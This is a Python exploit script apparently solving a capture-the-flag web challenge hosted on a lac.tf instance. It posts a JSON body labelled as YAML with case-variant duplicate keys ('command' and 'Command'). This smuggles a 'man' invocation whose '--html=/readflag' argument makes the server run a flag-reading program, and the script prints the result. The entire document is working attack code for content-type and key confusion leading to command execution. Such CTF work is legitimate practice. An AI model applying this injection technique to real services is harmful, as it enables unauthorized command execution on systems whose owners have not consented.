import requests
import json

TARGET_URL = 'https://glotq-dcf65.instancer.lac.tf/json'

payload = {
    "command": "jq",
    "Command": "man",
    "args": ["--html=/readflag", "jq"]
}

headers = {
    'Content-Type': 'application/yaml'
}

try:
    print(f"[*] Sending updated exploit to {TARGET_URL}...")
    response = requests.post(TARGET_URL, data=json.dumps(payload), headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success'):
            print("\n[+] Success! Output:\n")
            print(data['output'])
        else:
            print("\n[-] Failed (App returned error):", data.get('error'))
    else:
        print(f"\n[-] HTTP Error {response.status_code}: {response.text}")

except Exception as e:
    print(f"[-] Connection failed: {e}")